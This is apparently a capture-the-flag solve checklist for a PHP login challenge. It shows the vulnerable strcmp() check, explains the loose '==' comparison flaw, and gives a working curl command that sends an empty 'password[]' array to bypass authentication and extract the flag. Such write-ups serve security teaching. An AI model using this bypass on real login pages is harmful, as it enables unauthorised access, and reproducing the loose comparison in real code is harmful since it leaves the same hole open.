## Solve:

- [ ] View the source code and see a debug option
  http://206.189.59.199:8003/?debug

  ```php
  if (isset($_POST['password'])) {
    if (strcmp($_POST['password'], $flag) == 0)
  ```
  
<br/>

- [ ] See that the password is compared with the flag using `strcmp` and brings up 2 problems:<br/>
    - The comparation uses only 2 equal signs `==`, meaning it only checks that the values are equal, whereas the proper way would be to use 3 equal signs `===`, so it checks for both value and type.
    - For older versions, strcmp is vulnerable: it can compare an empty array to a value and return `0` (True)
    
<br/> 

- [ ] Send a HTTP POST request in which the `password` argument is an empty **array**, then extract the flag.
  ```bash
  curl -s -X POST 'http://206.189.59.199:8003/' -d 'username=admin&password[]=&submit=Login' \
  | tail -n1 | awk -F'Flag: ' '{print $2}' | cut -d' ' -f1
  ```
